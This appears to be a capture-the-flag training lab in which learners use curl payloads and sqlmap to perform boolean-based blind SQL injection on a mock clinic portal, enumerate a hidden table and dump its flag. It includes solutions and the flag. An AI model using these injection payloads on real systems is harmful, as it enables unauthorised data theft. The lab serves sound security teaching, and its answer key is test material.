title: SQL Injection — Boolean Blind (Northgate Vet Clinic)
description: A veterinary clinic's patient-lookup page is injectable, but the response never echoes query data — only 'found' or 'not found'. Use boolean-based blind SQL injection to enumerate hidden tables and extract the flag.
outcomes: Explain the difference between blind and error/UNION-based SQL injection.
Confirm a blind injection point by observing true/false page behaviour.
Use sqlmap with boolean-only technique to enumerate hidden tables without visible output.
Extract data character-by-character from a hidden table using automated blind injection.

levels.title: Introduction
levels.content:
# General information — please read carefully

* Each level builds on the previous one. Do not skip ahead.
* If you get stuck, use the hints — or search for the technique online.
* This exercise is for educational purposes only. Only attack systems within your sandbox.

# Storyline

You are a junior penetration tester at SecureWave Ltd. Your client, **Northgate Veterinary Clinic**, recently deployed an online patient-lookup portal so receptionists can search for pet records by ID.

During a pre-test interview a developer mentioned the portal was "thrown together quickly to hit a deadline" and that the database contains "one table the devs forgot to remove".

Your task: find the hidden table, extract its contents, and report the flag it contains — using only the true/false responses the page gives back.

levels.title: Get Access
levels.cloud_content:
SSH to your attacker machine at **10.1.36.23**. The clinic web server is at **10.1.36.10** (HTTP port 80).

Confirm the web service is reachable:

```
curl -s http://10.1.36.10/lookup.php?id=1
```

You should see a patient name in the response. Do not attack anything outside this sandbox. Submit **start** to begin.
levels.local_content:
The target web service is running locally on port **80**:

```
curl -s 'http://127.0.0.1/lookup.php?id=1'
```

You should see a patient name in the response. Submit **start** to begin.

levels.title: Confirm the Injection Point
levels.content:
The lookup endpoint takes a patient id and returns either **Patient found: <name>** or **No record found.** — nothing else.

Try these two requests and compare the responses:

```
curl -s 'http://10.1.36.10/lookup.php?id=1 AND 1=1'
curl -s 'http://10.1.36.10/lookup.php?id=1 AND 1=2'
```

The first should return a patient name; the second should say **No record found.** even though id=1 exists. This proves the `id` parameter is being evaluated as raw SQL — the server returns true/false based on the extra condition you injected.

This is **boolean-based blind SQL injection**: no data is echoed in the response, but the page's true/false behaviour leaks information about what is in the database.

**What is the patient name returned when you inject `id=1 AND 1=1`?**
levels.solution:
```
$ curl -s 'http://10.1.36.10/lookup.php?id=1 AND 1=1'
Patient found: Biscuit

$ curl -s 'http://10.1.36.10/lookup.php?id=1 AND 1=2'
No record found.
```

The different responses confirm the `id` parameter is injectable. The patient name is **Biscuit**.

hints.title: What am I looking for?
hints.content: Run both curl commands and compare the responses. `1=1` is always true; `1=2` is always false. If the page behaves differently for each, the condition you added is being evaluated as SQL.

hints.title: The patient name
hints.content: The patient name returned for id=1 is `Biscuit`.

levels.title: Enumerate the Hidden Table
levels.content:
You have confirmed blind injection in the `id` parameter. Now enumerate the database tables to find the hidden one the developer mentioned.

**Option A — sqlmap (recommended):**

Use sqlmap with boolean-only technique to list all tables without triggering errors:

```
sqlmap -u 'http://10.1.36.10/lookup.php?id=1' \
  --tables --batch --technique=B --dbms=SQLite
```

sqlmap will send many crafted requests — each response (found/not found) lets it infer one bit of information. When it finishes, it prints the table names it discovered.

**Option B — manual blind check:**

If you suspect a table name, verify it exists:

```
curl -s 'http://10.1.36.10/lookup.php?id=1 AND (SELECT COUNT(*) FROM sqlite_master WHERE type=\'table\' AND name=\'clinic_secrets\')'
```

A **Patient found** response means the table exists.

**What is the name of the hidden table containing sensitive clinic data?**
levels.solution:
```
$ sqlmap -u 'http://10.1.36.10/lookup.php?id=1' \
    --tables --batch --technique=B --dbms=SQLite
...
[INFO] fetching tables for database: 'SQLite_masterdb'
Database: SQLite_masterdb
[2 tables]
+----------------+
| patients       |
| clinic_secrets |
+----------------+
```

The hidden table is **clinic_secrets**.

hints.title: Which sqlmap flag lists tables?
hints.content: Use `--tables` to enumerate tables. Add `--technique=B` to restrict sqlmap to boolean-based blind injection, and `--dbms=SQLite` so it skips database fingerprinting.

hints.title: What is the table name pattern?
hints.content: The hidden table name is two words joined by an underscore. The first word relates to the clinic; the second word means confidential data.

levels.title: Extract the Flag
levels.content:
You know the hidden table is `clinic_secrets`. Now dump its contents using blind injection.

**Option A — sqlmap dump:**

```
sqlmap -u 'http://10.1.36.10/lookup.php?id=1' \
  -T clinic_secrets --dump --batch --technique=B --dbms=SQLite
```

sqlmap extracts each character of each value using binary search — hundreds of requests, but automated. The `record` column contains the flag.

**Option B — manual binary search (one character at a time):**

To extract the first character of `record`:

```
curl -s 'http://10.1.36.10/lookup.php?id=1 AND (SELECT CASE WHEN UNICODE(SUBSTR(record,1,1))>=87 THEN 1 ELSE 0 END FROM clinic_secrets)'
```

If **Patient found** → the first character has ASCII code ≥ 87. Narrow down with binary search until you identify each character.

In practice, attackers script this extraction — the principle is always the same: one bit of information per request.

**Submit the flag found in `clinic_secrets.record`.**
levels.solution:
```
$ sqlmap -u 'http://10.1.36.10/lookup.php?id=1' \
    -T clinic_secrets --dump --batch --technique=B --dbms=SQLite
...
Database: SQLite_masterdb
Table: clinic_secrets
[1 entry]
+----+--------------------------------------+
| id | record                               |
+----+--------------------------------------+
| 1  | WMG{bl1nd_sql1_tr00th_0r_n0_tr00th}  |
+----+--------------------------------------+
```

The flag is **WMG{bl1nd_sql1_tr00th_0r_n0_tr00th}**.

hints.title: Which sqlmap flags dump a specific table?
hints.content: Use `-T clinic_secrets --dump` to dump just that table. Add `--batch` for non-interactive mode.

hints.title: What format is the flag?
hints.content: The flag starts with `WMG{` and ends with `}`. It is the only row in the `record` column of `clinic_secrets`.

levels.title: Feedback
levels.instructions: Please answer these questions to help us improve the game.

questions.text: How difficult did you find this game?
Before this game, had you used sqlmap for automated SQL injection?

choices.text: I had heard of it but not used it
No, this was completely new to me

questions.text: How clear were the level instructions?
What would you change or add to improve this game?
